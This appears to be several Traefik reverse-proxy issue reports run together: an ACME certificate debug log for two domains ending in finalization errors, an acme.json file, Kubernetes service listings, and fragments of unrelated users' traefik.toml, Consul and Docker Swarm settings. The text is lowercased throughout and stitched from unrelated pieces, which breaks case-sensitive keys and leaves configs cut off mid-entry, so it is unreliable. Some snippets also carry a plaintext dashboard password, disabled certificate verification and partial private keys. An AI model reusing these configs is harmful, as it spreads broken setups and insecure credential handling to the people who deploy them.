\"enablepasstlscert\\":false,\\"namespaces\\":null,\\"labelselector\\":\\"\\",\\"ingressclass\\":\\"\\"},\\"mesos\\":null,\\"eureka\\":null,\\"ecs\\":null,\\"rancher\\":null,\\"dynamodb\\":null,\\"servicefabric\\":null,\\"rest\\":null,\\"api\\":{\\"entrypoint\\":\\"traefik\\",\\"dashboard\\":true,\\"debug\\":true,\\"currentconfigurations\\":null,\\"statistics\\":null},\\"metrics\\":null,\\"ping\\":{\\"entrypoint\\":\\"traefik\\"}}"
time="2018-05-31t06:36:40z" level=info msg="preparing server https &{address::443 tls: redirect:<nil> auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:true proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
time="2018-05-31t06:36:40z" level=debug msg="add certificate for domains *.example.com"
time="2018-05-31t06:36:40z" level=info msg="starting server on :443"
time="2018-05-31t06:36:40z" level=info msg="preparing server traefik &{address::8080 tls:<nil> redirect:<nil> auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
time="2018-05-31t06:36:40z" level=info msg="preparing server http &{address::80 tls:<nil> redirect: auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:true proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
time="2018-05-31t06:36:40z" level=info msg="starting server on :8080"
time="2018-05-31t06:36:40z" level=info msg="starting server on :80"
time="2018-05-31t06:36:40z" level=info msg="starting provider configuration.provideraggregator {}"
time="2018-05-31t06:36:40z" level=info msg="starting provider *kubernetes.provider {\\"watch\\":true,\\"filename\\":\\"\\",\\"constraints\\":[],\\"trace\\":false,\\"templateversion\\":0,\\"debugloggeneratedtemplate\\":false,\\"endpoint\\":\\"\\",\\"token\\":\\"\\",\\"certauthfilepath\\":\\"\\",\\"disablepasshostheaders\\":false,\\"enablepasstlscert\\":false,\\"namespaces\\":null,\\"labelselector\\":\\"\\",\\"ingressclass\\":\\"\\"}"
time="2018-05-31t06:36:40z" level=info msg="starting provider *acme.provider {\\"email\\":\\"my-name@my-company.com\\",\\"acmelogging\\":true,\\"caserver\\":\\" ",\\"storage\\":\\"/acme/acme.json\\",\\"entrypoint\\":\\"https\\",\\"onhostrule\\":true,\\"ondemand\\":false,\\"dnschallenge\\":null,\\"httpchallenge\\":{\\"entrypoint\\":\\"http\\"},\\"domains\\":null,\\"store\\":{}}"
time="2018-05-31t06:36:40z" level=info msg="testing certificate renew..."
time="2018-05-31t06:36:40z" level=debug msg="using ingress label selector: \\"\\""
time="2018-05-31t06:36:40z" level=info msg="ingress label selector is: \\"\\""
time="2018-05-31t06:36:40z" level=info msg="creating in-cluster provider client"
time="2018-05-31t06:36:40z" level=debug msg="configuration received from provider acme: {}"
time="2018-05-31t06:36:40z" level=info msg="server configuration reloaded on :80"
time="2018-05-31t06:36:40z" level=info msg="server configuration reloaded on :443"
time="2018-05-31t06:36:40z" level=info msg="server configuration reloaded on :8080"
time="2018-05-31t06:36:41z" level=debug msg="received kubernetes event kind *v1.endpoints"
time="2018-05-31t06:36:41z" level=debug msg="configuration received from provider kubernetes: {\\"backends\\":{\\"dash.spexian.com\\":{\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"lrs.spexian.com\\":{\\"servers\\":{\\"lrs-ui-6b8d6564d7-hgdx7\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}}},\\"frontends\\":{\\"dash.spexian.com\\":{\\"entrypoints\\":[\\"http\\",\\"https\\"],\\"backend\\":\\"dash.spexian.com\\",\\"routes\\":{\\"dash.spexian.com\\":{\\"rule\\":\\"host:dash.spexian.com\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":[]},\\"lrs.spexian.com\\":{\\"entrypoints\\":[\\"http\\",\\"https\\"],\\"backend\\":\\"lrs.spexian.com\\",\\"routes\\":{\\"lrs.spexian.com\\":{\\"rule\\":\\"host:lrs.spexian.com\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":[]}}}"
time="2018-05-31t06:36:41z" level=debug msg="creating frontend dash.spexian.com"
time="2018-05-31t06:36:41z" level=debug msg="wiring frontend dash.spexian.com to entrypoint http"
time="2018-05-31t06:36:41z" level=debug msg="creating route dash.spexian.com host:dash.spexian.com"
time="2018-05-31t06:36:41z" level=debug msg="creating regex redirect http -> ^ -> "
time="2018-05-31t06:36:41z" level=debug msg="creating backend dash.spexian.com"
time="2018-05-31t06:36:41z" level=debug msg="creating load-balancer wrr"
time="2018-05-31t06:36:41z" level=debug msg="wiring frontend dash.spexian.com to entrypoint https"
time="2018-05-31t06:36:41z" level=debug msg="creating route dash.spexian.com host:dash.spexian.com"
time="2018-05-31t06:36:41z" level=debug msg="creating backend dash.spexian.com"
time="2018-05-31t06:36:41z" level=debug msg="creating load-balancer wrr"
time="2018-05-31t06:36:41z" level=debug msg="creating frontend lrs.spexian.com"
time="2018-05-31t06:36:41z" level=debug msg="wiring frontend lrs.spexian.com to entrypoint http"
time="2018-05-31t06:36:41z" level=debug msg="creating route lrs.spexian.com host:lrs.spexian.com"
time="2018-05-31t06:36:41z" level=debug msg="creating backend lrs.spexian.com"
time="2018-05-31t06:36:41z" level=debug msg="creating load-balancer wrr"
time="2018-05-31t06:36:41z" level=debug msg="creating server lrs-ui-6b8d6564d7-hgdx7 at with weight 1"
time="2018-05-31t06:36:41z" level=debug msg="wiring frontend lrs.spexian.com to entrypoint https"
time="2018-05-31t06:36:41z" level=debug msg="creating route lrs.spexian.com host:lrs.spexian.com"
time="2018-05-31t06:36:41z" level=debug msg="creating backend lrs.spexian.com"
time="2018-05-31t06:36:41z" level=debug msg="creating load-balancer wrr"
time="2018-05-31t06:36:41z" level=debug msg="creating server lrs-ui-6b8d6564d7-hgdx7 at with weight 1"
time="2018-05-31t06:36:41z" level=info msg="server configuration reloaded on :80"
time="2018-05-31t06:36:41z" level=info msg="server configuration reloaded on :443"
time="2018-05-31t06:36:41z" level=info msg="server configuration reloaded on :8080"
time="2018-05-31t06:36:41z" level=debug msg="try to challenge certificate for domain [dash.spexian.com] founded in host rule"
time="2018-05-31t06:36:41z" level=debug msg="try to challenge certificate for domain [lrs.spexian.com] founded in host rule"
time="2018-05-31t06:36:41z" level=debug msg="looking for provided certificate(s) to validate [\\"lrs.spexian.com\\"]..."
time="2018-05-31t06:36:41z" level=debug msg="domains [\\"lrs.spexian.com\\"] need acme certificates generation for domains \\"lrs.spexian.com\\"."
time="2018-05-31t06:36:41z" level=debug msg="loading acme certificates [lrs.spexian.com]..."
time="2018-05-31t06:36:41z" level=debug msg="looking for provided certificate(s) to validate [\\"dash.spexian.com\\"]..."
time="2018-05-31t06:36:41z" level=debug msg="domains [\\"dash.spexian.com\\"] need acme certificates generation for domains \\"dash.spexian.com\\"."
time="2018-05-31t06:36:41z" level=debug msg="loading acme certificates [dash.spexian.com]..."
time="2018-05-31t06:36:49z" level=debug msg="configuration received from provider kubernetes: {\\"backends\\":{\\"dash.spexian.com\\":{\\"servers\\":{\\"traefik-78f5cc4cdc-tjr67\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"lrs.spexian.com\\":{\\"servers\\":{\\"lrs-ui-6b8d6564d7-hgdx7\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}}},\\"frontends\\":{\\"dash.spexian.com\\":{\\"entrypoints\\":[\\"http\\",\\"https\\"],\\"backend\\":\\"dash.spexian.com\\",\\"routes\\":{\\"dash.spexian.com\\":{\\"rule\\":\\"host:dash.spexian.com\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":[]},\\"lrs.spexian.com\\":{\\"entrypoints\\":[\\"http\\",\\"https\\"],\\"backend\\":\\"lrs.spexian.com\\",\\"routes\\":{\\"lrs.spexian.com\\":{\\"rule\\":\\"host:lrs.spexian.com\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":[]}}}"
time="2018-05-31t06:36:49z" level=debug msg="creating frontend dash.spexian.com"
time="2018-05-31t06:36:49z" level=debug msg="wiring frontend dash.spexian.com to entrypoint http"
time="2018-05-31t06:36:49z" level=debug msg="creating route dash.spexian.com host:dash.spexian.com"
time="2018-05-31t06:36:49z" level=debug msg="creating regex redirect http -> ^ -> "
time="2018-05-31t06:36:49z" level=debug msg="creating backend dash.spexian.com"
time="2018-05-31t06:36:49z" level=debug msg="creating load-balancer wrr"
time="2018-05-31t06:36:49z" level=debug msg="creating server traefik-78f5cc4cdc-tjr67 at with weight 1"
time="2018-05-31t06:36:49z" level=debug msg="wiring frontend dash.spexian.com to entrypoint https"
time="2018-05-31t06:36:49z" level=debug msg="creating route dash.spexian.com host:dash.spexian.com"
time="2018-05-31t06:36:49z" level=debug msg="creating backend dash.spexian.com"
time="2018-05-31t06:36:49z" level=debug msg="creating load-balancer wrr"
time="2018-05-31t06:36:49z" level=debug msg="creating server traefik-78f5cc4cdc-tjr67 at with weight 1"
time="2018-05-31t06:36:49z" level=debug msg="creating frontend lrs.spexian.com"
time="2018-05-31t06:36:49z" level=debug msg="wiring frontend lrs.spexian.com to entrypoint http"
time="2018-05-31t06:36:49z" level=debug msg="creating route lrs.spexian.com host:lrs.spexian.com"
time="2018-05-31t06:36:49z" level=debug msg="creating backend lrs.spexian.com"
time="2018-05-31t06:36:49z" level=debug msg="creating load-balancer wrr"
time="2018-05-31t06:36:49z" level=debug msg="creating server lrs-ui-6b8d6564d7-hgdx7 at with weight 1"
time="2018-05-31t06:36:49z" level=debug msg="wiring frontend lrs.spexian.com to entrypoint https"
time="2018-05-31t06:36:49z" level=debug msg="creating route lrs.spexian.com host:lrs.spexian.com"
time="2018-05-31t06:36:49z" level=debug msg="creating backend lrs.spexian.com"
time="2018-05-31t06:36:49z" level=debug msg="creating load-balancer wrr"
time="2018-05-31t06:36:49z" level=debug msg="creating server lrs-ui-6b8d6564d7-hgdx7 at with weight 1"
time="2018-05-31t06:36:49z" level=info msg="server configuration reloaded on :80"
time="2018-05-31t06:36:49z" level=info msg="server configuration reloaded on :443"
time="2018-05-31t06:36:49z" level=info msg="server configuration reloaded on :8080"
time="2018-05-31t06:36:49z" level=debug msg="try to challenge certificate for domain [dash.spexian.com] founded in host rule"
time="2018-05-31t06:36:49z" level=debug msg="try to challenge certificate for domain [lrs.spexian.com] founded in host rule"
time="2018-05-31t06:36:49z" level=debug msg="looking for provided certificate(s) to validate [\\"lrs.spexian.com\\"]..."
time="2018-05-31t06:36:49z" level=debug msg="domains [\\"lrs.spexian.com\\"] need acme certificates generation for domains \\"lrs.spexian.com\\"."
time="2018-05-31t06:36:49z" level=debug msg="loading acme certificates [lrs.spexian.com]..."
time="2018-05-31t06:36:49z" level=debug msg="looking for provided certificate(s) to validate [\\"dash.spexian.com\\"]..."
time="2018-05-31t06:36:49z" level=debug msg="domains [\\"dash.spexian.com\\"] need acme certificates generation for domains \\"dash.spexian.com\\"."
time="2018-05-31t06:36:49z" level=debug msg="loading acme certificates [dash.spexian.com]..."
time="2018-05-31t06:36:58z" level=debug msg="building acme client..."
time="2018-05-31t06:36:58z" level=debug msg=" "
legolog: 2018/05/31 06:37:00 [info] acme: registering account for my-name@my-company.com
time="2018-05-31t06:37:00z" level=info msg=register...
time="2018-05-31t06:37:01z" level=debug msg="using http challenge provider."
legolog: 2018/05/31 06:37:01 [info][lrs.spexian.com] acme: obtaining bundled san certificate
legolog: 2018/05/31 06:37:01 [info][dash.spexian.com] acme: obtaining bundled san certificate
legolog: 2018/05/31 06:37:01 [info][lrs.spexian.com] acme: obtaining bundled san certificate
legolog: 2018/05/31 06:37:01 [info][dash.spexian.com] acme: obtaining bundled san certificate
legolog: 2018/05/31 06:37:03 [info][lrs.spexian.com] authurl:
legolog: 2018/05/31 06:37:03 [info][lrs.spexian.com] acme: could not find solver for: dns-01
legolog: 2018/05/31 06:37:03 [info][lrs.spexian.com] acme: trying to solve http-01
legolog: 2018/05/31 06:37:03 [info][lrs.spexian.com] authurl:
legolog: 2018/05/31 06:37:03 [info][lrs.spexian.com] acme: could not find solver for: dns-01
legolog: 2018/05/31 06:37:03 [info][lrs.spexian.com] acme: trying to solve http-01
legolog: 2018/05/31 06:37:03 [info][dash.spexian.com] authurl:
legolog: 2018/05/31 06:37:03 [info][dash.spexian.com] acme: could not find solver for: dns-01
legolog: 2018/05/31 06:37:03 [info][dash.spexian.com] acme: trying to solve http-01
legolog: 2018/05/31 06:37:04 [info][dash.spexian.com] authurl:
legolog: 2018/05/31 06:37:04 [info][dash.spexian.com] acme: could not find solver for: dns-01
legolog: 2018/05/31 06:37:04 [info][dash.spexian.com] acme: trying to solve http-01
time="2018-05-31t06:37:04z" level=debug msg="unable to split host and port: address lrs.spexian.com: missing port in address
fallback to request host."
time="2018-05-31t06:37:04z" level=debug msg="looking for an existing acme challenge for token 37ocs3r70dk1qruqyebl4r-tiqwpiur9j4otiujtgas..."
time="2018-05-31t06:37:05z" level=debug msg="unable to split host and port: address lrs.spexian.com: missing port in address
fallback to request host."
time="2018-05-31t06:37:05z" level=debug msg="looking for an existing acme challenge for token 37ocs3r70dk1qruqyebl4r-tiqwpiur9j4otiujtgas..."
time="2018-05-31t06:37:05z" level=debug msg="unable to split host and port: address lrs.spexian.com: missing port in address
fallback to request host."
time="2018-05-31t06:37:05z" level=debug msg="looking for an existing acme challenge for token 37ocs3r70dk1qruqyebl4r-tiqwpiur9j4otiujtgas..."
time="2018-05-31t06:37:05z" level=debug msg="unable to split host and port: address lrs.spexian.com: missing port in address
fallback to request host."
time="2018-05-31t06:37:05z" level=debug msg="looking for an existing acme challenge for token 37ocs3r70dk1qruqyebl4r-tiqwpiur9j4otiujtgas..."
time="2018-05-31t06:37:05z" level=debug msg="unable to split host and port: address lrs.spexian.com: missing port in address
fallback to request host."
time="2018-05-31t06:37:05z" level=debug msg="unable to split host and port: address lrs.spexian.com: missing port in address
fallback to request host."
time="2018-05-31t06:37:05z" level=debug msg="looking for an existing acme challenge for token 37ocs3r70dk1qruqyebl4r-tiqwpiur9j4otiujtgas..."
time="2018-05-31t06:37:05z" level=debug msg="unable to split host and port: address dash.spexian.com: missing port in address
fallback to request host."
time="2018-05-31t06:37:05z" level=debug msg="looking for an existing acme challenge for token 37ocs3r70dk1qruqyebl4r-tiqwpiur9j4otiujtgas..."
time="2018-05-31t06:37:05z" level=debug msg="looking for an existing acme challenge for token 8_srkalnmrnhpeqehbolrvqafspikow83anhug1rdre..."
time="2018-05-31t06:37:05z" level=debug msg="unable to split host and port: address lrs.spexian.com: missing port in address
fallback to request host."
time="2018-05-31t06:37:05z" level=debug msg="looking for an existing acme challenge for token 37ocs3r70dk1qruqyebl4r-tiqwpiur9j4otiujtgas..."
time="2018-05-31t06:37:05z" level=debug msg="unable to split host and port: address lrs.spexian.com: missing port in address
fallback to request host."
time="2018-05-31t06:37:05z" level=debug msg="looking for an existing acme challenge for token 37ocs3r70dk1qruqyebl4r-tiqwpiur9j4otiujtgas..."
time="2018-05-31t06:37:05z" level=debug msg="unable to split host and port: address dash.spexian.com: missing port in address
fallback to request host."
time="2018-05-31t06:37:05z" level=debug msg="looking for an existing acme challenge for token 8_srkalnmrnhpeqehbolrvqafspikow83anhug1rdre..."
time="2018-05-31t06:37:05z" level=debug msg="unable to split host and port: address dash.spexian.com: missing port in address
fallback to request host."
time="2018-05-31t06:37:05z" level=debug msg="looking for an existing acme challenge for token 8_srkalnmrnhpeqehbolrvqafspikow83anhug1rdre..."
time="2018-05-31t06:37:05z" level=debug msg="unable to split host and port: address dash.spexian.com: missing port in address
fallback to request host."
time="2018-05-31t06:37:05z" level=debug msg="looking for an existing acme challenge for token 8_srkalnmrnhpeqehbolrvqafspikow83anhug1rdre..."
time="2018-05-31t06:37:05z" level=debug msg="unable to split host and port: address dash.spexian.com: missing port in address
fallback to request host."
time="2018-05-31t06:37:05z" level=debug msg="looking for an existing acme challenge for token 8_srkalnmrnhpeqehbolrvqafspikow83anhug1rdre..."
time="2018-05-31t06:37:05z" level=debug msg="unable to split host and port: address dash.spexian.com: missing port in address
fallback to request host."
time="2018-05-31t06:37:05z" level=debug msg="looking for an existing acme challenge for token 8_srkalnmrnhpeqehbolrvqafspikow83anhug1rdre..."
time="2018-05-31t06:37:05z" level=debug msg="unable to split host and port: address dash.spexian.com: missing port in address
fallback to request host."
time="2018-05-31t06:37:05z" level=debug msg="looking for an existing acme challenge for token 8_srkalnmrnhpeqehbolrvqafspikow83anhug1rdre..."
time="2018-05-31t06:37:05z" level=debug msg="unable to split host and port: address dash.spexian.com: missing port in address
fallback to request host."
time="2018-05-31t06:37:05z" level=debug msg="looking for an existing acme challenge for token 8_srkalnmrnhpeqehbolrvqafspikow83anhug1rdre..."
time="2018-05-31t06:37:09z" level=debug msg="challenge cleanup for domain lrs.spexian.com"
legolog: 2018/05/31 06:37:09 [info][lrs.spexian.com] the server validated our request
legolog: 2018/05/31 06:37:09 [info][lrs.spexian.com] acme: validations succeeded; requesting certificates
legolog: 2018/05/31 06:37:10 [info][lrs.spexian.com] the server validated our request
legolog: 2018/05/31 06:37:10 [info][lrs.spexian.com] acme: validations succeeded; requesting certificates
time="2018-05-31t06:37:10z" level=debug msg="challenge cleanup for domain lrs.spexian.com"
legolog: 2018/05/31 06:37:10 [info][dash.spexian.com] the server validated our request
legolog: 2018/05/31 06:37:10 [info][dash.spexian.com] acme: validations succeeded; requesting certificates
time="2018-05-31t06:37:10z" level=debug msg="challenge cleanup for domain dash.spexian.com"
legolog: 2018/05/31 06:37:10 [info][dash.spexian.com] the server validated our request
legolog: 2018/05/31 06:37:10 [info][dash.spexian.com] acme: validations succeeded; requesting certificates
time="2018-05-31t06:37:10z" level=debug msg="challenge cleanup for domain dash.spexian.com"
legolog: 2018/05/31 06:40:06 [info][dash.spexian.com] server responded with a certificate.
time="2018-05-31t06:40:06z" level=debug msg="certificates obtained for domains [dash.spexian.com]"
time="2018-05-31t06:40:06z" level=debug msg="configuration received from provider acme: {\\"tls\\":[{\\"entrypoints\\":[\\"https\\"],\\"certificate\\":{\\"certfile\\":\\"-----begin certificate-----\\\ ...qhtzithi5yaufs+s\\\ nw==\\\ -----end certificate-----\\\ \\\ -----begin certificate-----\\\ ...+svqkomoqglnoaxu=\\\ -----end certificate-----\\\ \\",\\"keyfile\\":\\"-----begin rsa private key-----\\\ ...7q0lhyqnh1tftu=\\\ -----end rsa private key-----\\\ \\"}}]}"
time="2018-05-31t06:40:06z" level=debug msg="creating frontend dash.spexian.com"
time="2018-05-31t06:40:06z" level=debug msg="wiring frontend dash.spexian.com to entrypoint http"
time="2018-05-31t06:40:06z" level=debug msg="creating route dash.spexian.com host:dash.spexian.com"
time="2018-05-31t06:40:06z" level=debug msg="creating regex redirect http -> ^ -> "
time="2018-05-31t06:40:06z" level=debug msg="creating backend dash.spexian.com"
time="2018-05-31t06:40:06z" level=debug msg="creating load-balancer wrr"
time="2018-05-31t06:40:06z" level=debug msg="creating server traefik-78f5cc4cdc-tjr67 at with weight 1"
time="2018-05-31t06:40:06z" level=debug msg="wiring frontend dash.spexian.com to entrypoint https"
time="2018-05-31t06:40:06z" level=debug msg="creating route dash.spexian.com host:dash.spexian.com"
time="2018-05-31t06:40:06z" level=debug msg="creating backend dash.spexian.com"
time="2018-05-31t06:40:06z" level=debug msg="creating load-balancer wrr"
time="2018-05-31t06:40:06z" level=debug msg="creating server traefik-78f5cc4cdc-tjr67 at with weight 1"
time="2018-05-31t06:40:06z" level=debug msg="creating frontend lrs.spexian.com"
time="2018-05-31t06:40:06z" level=debug msg="wiring frontend lrs.spexian.com to entrypoint http"
time="2018-05-31t06:40:06z" level=debug msg="creating route lrs.spexian.com host:lrs.spexian.com"
time="2018-05-31t06:40:06z" level=debug msg="creating backend lrs.spexian.com"
time="2018-05-31t06:40:06z" level=debug msg="creating load-balancer wrr"
time="2018-05-31t06:40:06z" level=debug msg="creating server lrs-ui-6b8d6564d7-hgdx7 at with weight 1"
time="2018-05-31t06:40:06z" level=debug msg="wiring frontend lrs.spexian.com to entrypoint https"
time="2018-05-31t06:40:06z" level=debug msg="creating route lrs.spexian.com host:lrs.spexian.com"
time="2018-05-31t06:40:06z" level=debug msg="creating backend lrs.spexian.com"
time="2018-05-31t06:40:06z" level=debug msg="creating load-balancer wrr"
time="2018-05-31t06:40:06z" level=debug msg="creating server lrs-ui-6b8d6564d7-hgdx7 at with weight 1"
time="2018-05-31t06:40:07z" level=debug msg="add certificate for domains dash.spexian.com"
time="2018-05-31t06:40:07z" level=info msg="server configuration reloaded on :8080"
time="2018-05-31t06:40:07z" level=info msg="server configuration reloaded on :80"
time="2018-05-31t06:40:07z" level=info msg="server configuration reloaded on :443"
legolog: 2018/05/31 06:40:37 [info][lrs.spexian.com] server responded with a certificate.
time="2018-05-31t06:40:37z" level=debug msg="certificates obtained for domains [lrs.spexian.com]"
time="2018-05-31t06:40:38z" level=debug msg="configuration received from provider acme: {\\"tls\\":[{\\"entrypoints\\":[\\"https\\"],\\"certificate\\":{\\"certfile\\":\\"-----begin certificate-----\\\ ...tzithi5yaufs+s\\\ nw==\\\ -----end certificate-----\\\ \\\ -----begin certificate-----\\\ ...vqkomoqglnoaxu=\\\ -----end certificate-----\\\ \\",\\"keyfile\\":\\"-----begin rsa private key-----\\\\...7q0lhyqnh1tftu=\\\ -----end rsa private key-----\\\ \\"}},{\\"entrypoints\\":[\\"https\\"],\\"certificate\\":{\\"certfile\\":\\"-----begin certificate-----\\\\...nf5t5u1xtobtyj\\\ -----end certificate-----\\\ \\\ -----begin certificate-----\\\ ...komoqglnoaxu=\\\ -----end certificate-----\\\ \\",\\"keyfile\\":\\"-----begin rsa private...qbraxzzd0m\\\ -----end rsa private key-----\\\ \\"}}]}"
time="2018-05-31t06:40:38z" level=debug msg="creating frontend dash.spexian.com"
time="2018-05-31t06:40:38z" level=debug msg="wiring frontend dash.spexian.com to entrypoint http"
time="2018-05-31t06:40:38z" level=debug msg="creating route dash.spexian.com host:dash.spexian.com"
time="2018-05-31t06:40:38z" level=debug msg="creating regex redirect http -> ^ -> "
time="2018-05-31t06:40:38z" level=debug msg="creating backend dash.spexian.com"
time="2018-05-31t06:40:38z" level=debug msg="creating load-balancer wrr"
time="2018-05-31t06:40:38z" level=debug msg="creating server traefik-78f5cc4cdc-tjr67 at with weight 1"
time="2018-05-31t06:40:38z" level=debug msg="wiring frontend dash.spexian.com to entrypoint https"
time="2018-05-31t06:40:38z" level=debug msg="creating route dash.spexian.com host:dash.spexian.com"
time="2018-05-31t06:40:38z" level=debug msg="creating backend dash.spexian.com"
time="2018-05-31t06:40:38z" level=debug msg="creating load-balancer wrr"
time="2018-05-31t06:40:38z" level=debug msg="creating server traefik-78f5cc4cdc-tjr67 at with weight 1"
time="2018-05-31t06:40:38z" level=debug msg="creating frontend lrs.spexian.com"
time="2018-05-31t06:40:38z" level=debug msg="wiring frontend lrs.spexian.com to entrypoint http"
time="2018-05-31t06:40:38z" level=debug msg="creating route lrs.spexian.com host:lrs.spexian.com"
time="2018-05-31t06:40:38z" level=debug msg="creating backend lrs.spexian.com"
time="2018-05-31t06:40:38z" level=debug msg="creating load-balancer wrr"
time="2018-05-31t06:40:38z" level=debug msg="creating server lrs-ui-6b8d6564d7-hgdx7 at with weight 1"
time="2018-05-31t06:40:38z" level=debug msg="wiring frontend lrs.spexian.com to entrypoint https"
time="2018-05-31t06:40:38z" level=debug msg="creating route lrs.spexian.com host:lrs.spexian.com"
time="2018-05-31t06:40:38z" level=debug msg="creating backend lrs.spexian.com"
time="2018-05-31t06:40:38z" level=debug msg="creating load-balancer wrr"
time="2018-05-31t06:40:38z" level=debug msg="creating server lrs-ui-6b8d6564d7-hgdx7 at with weight 1"
time="2018-05-31t06:40:38z" level=debug msg="add certificate for domains dash.spexian.com"
time="2018-05-31t06:40:38z" level=debug msg="add certificate for domains lrs.spexian.com"
time="2018-05-31t06:40:38z" level=info msg="server configuration reloaded on :80"
time="2018-05-31t06:40:38z" level=info msg="server configuration reloaded on :443"
time="2018-05-31t06:40:38z" level=info msg="server configuration reloaded on :8080"
time="2018-05-31t06:41:14z" level=error msg="unable to obtain acme certificate for domains \\"lrs.spexian.com\\" detected thanks to rule \\"host:lrs.spexian.com\\" : cannot obtain certificates: acme: error -> one or more domains had a problem:\ [lrs.spexian.com] acme: error 400 - urn:ietf:params:acme:error:malformed - order\'s status (\\"valid\\") is not acceptable for finalization\ "
time="2018-05-31t06:41:20z" level=error msg="unable to obtain acme certificate for domains \\"dash.spexian.com\\" detected thanks to rule \\"host:dash.spexian.com\\" : cannot obtain certificates: acme: error -> one or more domains had a problem:\ [dash.spexian.com] acme: error 400 - urn:ietf:params:acme:error:malformed - order\'s status (\\"valid\\") is not acceptable for finalization\ "
``` ### acme.json file
{ "account": { "email": "my-name@my-company.com", "registration": { "body": { "status": "valid", "contact": [ "mailto:my-name@my-company.com" ] }, "uri": " " }, "privatekey": "...vjec4m2o0i6sk=" }, "certificates": [ { "domain": { "main": "dash.spexian.com", "sans": null }, "certificate": "...jusuzjq0furs0tls0tcg==", "key": "...gs0vzls0tls0k" }, { "domain": { "main": "lrs.spexian.com", "sans": null }, "certificate": "...jusuzjq0furs0tls0tcg==", "key": "...gs0vzls0tls0k" } ], "httpchallenges": {}
``` ### pods and exposed services
name ready status restarts age ip node
lrs-ui-6b8d6564d7-hgdx7 1/1 running 0 18h 10.244.0.95 dev-docker01
traefik-78f5cc4cdc-tjr67 1/1 running 0 17m 10.244.0.113 dev-docker01 name type cluster-ip external-ip port(s) age selector
kubernetes clusterip 10.96.0.1 <none> 443/tcp 19h <none>
lrs-ui nodeport 10.107.246.18 <none> 3000:30985/tcp,8080:30641/tcp 18h app=lrs-ui
traefik nodeport 10.106.83.250 91.199.186.74 80:31342/tcp,443:31194/tcp 17m app=traefik,release=traefik
traefik-dashboard clusterip 10.98.253.168 <none> 80/tcp 17m app=traefik,release=traefik
debug = false
loglevel = "error"
checknewversion = false
defaultentrypoints = ["https"] [web]
address = ":8080" [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] [frontends]
passhostheader = true [docker]
domain = "bar.com"
exposedbydefault = false [acme]
email = "foo@bar.com"
storagefile = "/etc/traefik/acme.json"
ondemand = true
onhostrule = true
entrypoint = "https"
```toml # traefik.toml loglevel = "info" insecureskipverify = true defaultentrypoints = ["http","https"] [entrypoints] [entrypoints.http] address = ":80" compress = true [entrypoints.https] address = ":443" compress = true [entrypoints.https.tls] [[entrypoints.https.tls.certificates]] certfile = "/ssl/tls.crt" keyfile = "/ssl/tls.key" [kubernetes] [web] address = ":8080" [web.auth.basic] users = ["k8s-lb:gemini@123",]
endpoint = "sd1.mydomain:8500"
watch = true
prefix = "traefik" [consulcatalog]
endpoint = "sd1.mydomain:8500"
exposedbydefault = true
domain = "mydomain"
prefix = "traefik"
watch = true
trace = true [web]
address = ":8080"
readonly = false [accesslog]
``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) no logs are seen because no change is detected on health checks state change.
docker swarm backend
configuration store :+1: consul kv
arguments: ``` -consul --consul.endpoint=admin_consul:8500 --consul.prefix=traefik
docker service environments : ```
aws_secret_access_key=xxx aws_access_key_id=xxx aws_hosted_zone_id=xxx
traefik/acme/:
traefik/acme/account/lock:a74a7c07-8ab5-40cb-b995-1a9ff12da459
traefik/acme/account/object:[binary cert info]
traefik/acme/acmelogging:true
traefik/acme/caserver:
traefik/acme/dnschallenge/delaybeforecheck:0
traefik/acme/dnschallenge/provider:route53
traefik/acme/domains/0/main:*.mydomain.io
traefik/acme/domains/0/sans/0:mydomain.io
traefik/acme/email:contact@mydomain.com
traefik/acme/entrypoint:https
traefik/acme/httpchallenge/:
traefik/acme/httpchallenge/entrypoint:http
traefik/acme/ondemand:false
traefik/acme/onhostrule:true traefik/acme/storage:traefik/acme/account ```
### if applicable, please paste the log output at debug level (`--loglevel=debug` switch) ``` ```
```toml defaultentrypoints = ["http","https"] loglevel = "info" [respondingtimeouts] readtimeout = "60s" writetimeout = "60s" [traefiklog] format = "json" [accesslog] format = "json" [accesslog.fields] [accesslog.fields.names] "clientaddr" = "drop" "clientport" = "drop" "requestpath" = "drop" "requestprotocol" = "drop" "startlocal" = "drop" [accesslog.fields.headers] [accesslog.fields.headers.names] "etag" = "drop" [kubernetes] namespaces = ["redacted"] [entrypoints] [entrypoints.http] address = ":80" compress = true [entrypoints.http.proxyprotocol] trustedips = ["redacted"] [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" compress = true [entrypoints.https.proxyprotocol] trustedips = ["redacted"] [entrypoints.https.tls] minversion = "versiontls11" ciphersuites = ["tls_ecdhe_rsa_with_aes_128_gcm_sha256","tls_ecdhe_rsa_with_aes_256_gcm_sha384","tls_ecdhe_rsa_with_aes_128_cbc_sha","tls_ecdhe_rsa_with_aes_256_cbc_sha","tls_rsa_with_aes_128_gcm_sha256","tls_rsa_with_aes_256_gcm_sha384","tls_rsa_with_aes_128_cbc_sha","tls_rsa_with_aes_256_cbc_sha"] [[entrypoints.https.tls.certificates]] certfile = "/etc/tls/tls.crt" keyfile = "/etc/tls/tls.key" [api] dashboard = true [api.statistics] recenterrors = 10 [ping] [metrics] [metrics.prometheus] buckets = [0.1,0.3,1.2,5.0] [metrics.statistics] recenterrors = 10 [acme] email = "redacted" storage = "/acme/acme.json" entrypoint = "https" ondemand = false onhostrule = 